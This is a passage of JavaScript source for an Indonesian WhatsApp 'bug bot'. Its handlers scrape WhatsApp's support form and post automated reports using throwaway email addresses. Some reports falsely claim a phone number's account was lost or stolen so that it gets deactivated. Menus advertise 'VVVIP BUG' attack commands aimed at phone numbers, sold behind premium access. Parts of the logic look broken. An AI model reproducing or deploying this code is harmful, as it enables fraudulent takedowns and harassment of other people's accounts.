let cekno = await ekuzika.onWhatsApp(text)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (text == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban3}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
m.reply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
m.reply(`Sedang Limit Tunggu Beberapa Saat.`)
m.reply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================/
case 'unbandv4': {
if ((!(isGroupAdmins || isCreator))) return m.reply('𝘖𝘯𝘭𝘺 𝘍𝘰𝘳 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘜𝘴𝘦𝘳 ;(')
await loading()
if (!text) {
let cekno = await ekuzika.onWhatsApp(text)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (text == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban4}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
m.reply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
m.reply(`Sedang Limit Tunggu Beberapa Saat.`)
m.reply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================/
case 'unbandv5': {
if (!isPremium && !isOwner) return m.reply(mess.only.premium)
await loading()
if (!text) {
let cekno = await ekuzika.onWhatsApp(text)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (text == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban5}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
m.reply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
m.reply(`Sedang Limit Tunggu Beberapa Saat.`)
m.reply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================/
case 'unbandv6': {
if (!isPremium && !isOwner) return m.reply(mess.only.premium)
await loading()
if (!text) {
let cekno = await ekuzika.onWhatsApp(text)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (text == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban6}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
m.reply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
m.reply(`Sedang Limit Tunggu Beberapa Saat.`)
m.reply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================/
case 'kenonin': case 'logout': {
if (!isPremium && !isOwner) return m.reply(mess.only.premium)
await loading()
if (!text) {
let cekno = await ekuzika.onWhatsApp(text)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (text == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Mohon untuk segera menonaktifkan akun saya karena telah hilang/dicuri, sebelum akun WhatsApp saya direbut oleh pihak yang tidak bertanggung jawab.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
m.reply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
m.reply(`Sedang Limit Tunggu Beberapa Saat.`)
m.reply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================/
case 'verify': {
if (!isPremium && !isOwner) return m.reply(mess.only.premium)
await loading()
if (!text) {
let cekno = await ekuzika.onWhatsApp(text)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (text == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Mohon untuk segera menonaktifkan akun saya yang hilang/dicuri.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
m.reply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
m.reply(`Sedang Limit Tunggu Beberapa Saat.`)
m.reply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break

case 'showmenu':
case "show":
case "mulai": {
if (!isPremium) return m.reply(mess.only.premium)
//await loading()
const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)
//var fthm = await reSize(thumbVid, 640, 480)
const menu = `
Halo ${pushname} 👋, Saya adalah ${namabot} Bot Bug yang dilengkapi dengan Ai. Ada yang bisa saya bantu?

› 𝐎𝐰𝐧𝐞𝐫 : ${namacreator}
› 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗘𝗸𝘂𝘇𝗶𝗸𝗮 [ 𝐃𝐞𝐯 ]
› 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
› 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 1.4
› 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
${readMore}

*\`M E N U\`*
${global.pinggir} ${prefix}ebp-bug 
${global.pinggir} ${prefix}ebp-menu 


┏━━⬣  Thanks To  友
┃ 🔥 𝐄𝐤𝐮𝐳𝐢𝐤𝐚 <𝐃𝐞𝐯>
┃ 🔥 𝐙𝐲𝐧𝐱𝐳𝐨𝐨 <𝐁𝐚𝐬𝐞>
┃ 🔥 𝐆𝐲𝐛𝐫𝐚𝐧𝐭
┃ 🔥 𝐏𝐱𝐲𝐫𝐚
┃ 🔥 𝐏𝐚𝐤𝐭𝐳𝐲
┃ 🔥 𝐍𝐞𝐫𝐨𝐱
┃ 🔥 𝐃𝐡𝐢𝐤𝐚
┃ 🔥 𝐀𝐱𝐞𝐳𝐳
┗━━━━━━━━━━⬣
`
ekuzika.sendMessage(m.chat, { video: { url: thumbVid }, caption: menu, gifPlayback: true, contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true
    } 
  }, { quoted: fpay })
  await sleep(1000)
  await ekuzika.sendMessage(m.chat, { audio: { url: "https://pomf2.lain.la/f/l19ttab.mp3" }, mimetype: "audio/mp4", ptt: true })
}
break

case 'ebp-bug': {
if (!isPremium) return reply(mess.only.premium)
const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)
//var fthm = await reSize(thumbVid, 640, 480)
const ebpmenu = `
Halo ${pushname} 👋, Saya adalah ${namabot} Bot Bug yang dilengkapi dengan Ai. Ada yang bisa saya bantu?

› 𝐎𝐰𝐧𝐞𝐫 : ${namacreator}
› 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗘𝗸𝘂𝘇𝗶𝗸𝗮 [ 𝐃𝐞𝐯 ]
› 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
› 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 1.4
› 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
${readMore}

*\`VVVIP BUG\`*
${global.pinggir} ${prefix}xebp  </628xx>

*\`XVVIP BUG\`*
${global.pinggir} ${prefix}xebp-ip  </628xx>

*\`BUG IN PLACE\`*
${global.pinggir} ${prefix}c2?
${global.pinggir} ${prefix}tau-exz?
${global.pinggir} ${prefix}tau-gybrant?
${global.pinggir} ${prefix}tau-pxyra?


┏━━⬣  Thanks To  友
┃ 🔥 𝐄𝐤𝐮𝐳𝐢𝐤𝐚 <𝐃𝐞𝐯>
┃ 🔥 𝐙𝐲𝐧𝐱𝐳𝐨𝐨 <𝐁𝐚𝐬𝐞>
┃ 🔥 𝐆𝐲𝐛𝐫𝐚𝐧𝐭
┃ 🔥 𝐏𝐱𝐲𝐫𝐚
┃ 🔥 𝐏𝐚𝐤𝐭𝐳𝐲
┃ 🔥 𝐍𝐞𝐫𝐨𝐱
┃ 🔥 𝐃𝐡𝐢𝐤𝐚
┃ 🔥 𝐀𝐱𝐞𝐳𝐳
┗━━━━━━━━━━⬣
`
ekuzika.sendMessage(m.chat, { video: { url: thumbVid }, caption: ebpmenu, gifPlayback: true, contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true
    } 
  }, { quoted: fpay })
  //ekuzika.sendMessage(m.chat, { audio: { url: "https://pomf2.lain.la/f/l19ttab.mp3" }, mimetype: "audio/mp4", ptt: true })
}
break

case 'ebp-menu': {
if (!isPremium) return m.reply(mess.only.premium)
//await loading()
const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)
//var fthm = await reSize(thumbVid, 640, 480)
//const fthm = await reSize(xbug, 640, 480)
const ebpshow = `
Halo ${pushname} 👋, Saya adalah ${namabot} Bot Bug yang dilengkapi dengan Ai. Ada yang bisa saya bantu?

› 𝐎𝐰𝐧𝐞𝐫 : ${namacreator}
› 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : 𝗘𝗸𝘂𝘇𝗶𝗸𝗮 [ 𝐃𝐞𝐯 ]
› 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
› 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 1.4
› 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
${readMore}

*\`OWNER CMD\`*
${global.pinggir} ${prefix}antibugon
${global.pinggir} ${prefix}antibugoff
${global.pinggir} ${prefix}Setowner
${global.pinggir} ${prefix}Addowner
${global.pinggir} ${prefix}Delowner
${global.pinggir} ${prefix}Addprem
${global.pinggir} ${prefix}Delprem
${global.pinggir} ${prefix}Public
${global.pinggir} ${prefix}Self
${global.pinggir} ${prefix}Decrypt
${global.pinggir} ${prefix}Unlockbug

*\`TOOLS MENU\`*
${global.pinggir} ${prefix}Sticker
${global.pinggir} ${prefix}Stickertext
${global.pinggir} ${prefix}Enc
${global.pinggir} ${prefix}Hdvid
${global.pinggir} ${prefix}Kenonin
${global.pinggir} ${prefix}Tqto
${global.pinggir} ${prefix}Totalfitur
${global.pinggir} ${prefix}Tiktok
${global.pinggir} ${prefix}Autoai
${global.pinggir} ${prefix}Tiktokslide
${global.pinggir} ${prefix}Quickchat
${global.pinggir} ${prefix}Tourl
${global.pinggir} ${prefix}Togif
${global.pinggir} ${prefix}Remini

*\`GROUPS MENU\`* 
${global.pinggir} ${prefix}Promote
${global.pinggir} ${prefix}Kick
${global.pinggir} ${prefix}Tagall
${global.pinggir} ${prefix}Hidetag
${global.pinggir} ${prefix}Demote


┏━━⬣  Thanks To  友
┃ 🔥 𝐄𝐤𝐮𝐳𝐢𝐤𝐚 <𝐃𝐞𝐯>
┃ 🔥 𝐙𝐲𝐧𝐱𝐳𝐨𝐨 <𝐁𝐚𝐬𝐞>
┃ 🔥 𝐆𝐲𝐛𝐫𝐚𝐧𝐭
┃ 🔥 𝐏𝐱𝐲𝐫𝐚
┃ 🔥 𝐏𝐚𝐤𝐭𝐳𝐲
┃ 🔥 𝐍𝐞𝐫𝐨𝐱
┃ 🔥 𝐃𝐡𝐢𝐤𝐚
┃ 🔥 𝐀𝐱𝐞𝐳𝐳
┗━━━━━━━━━━⬣
`
ekuzika.sendMessage(m.chat, { video: { url: thumbVid }, caption: ebpshow, gifPlayback: true, contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true
    } 
  }, { quoted: fpay })
  await sleep(1000)
  await ekuzika.sendMessage(m.chat, { audio: { url: "https://pomf2.lain.la/f/l19ttab.mp3" }, mimetype: "audio/mp4", ptt: true })
}
break

case 'z': case 'hidetag':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(` \`[ # ] Fitur Ini Cuma Bisa Di Akses Oleh Owner\` `)
if (!text) return reply(`Teks?`)
ekuzika.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break

case "tagall": {
if (!isOwner && !isAdmins) return reply(mess.admin)
if (!isGroup) return joreply(mess.only.group)
if (!q) return reply(`Teks Nya Mana Pea?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎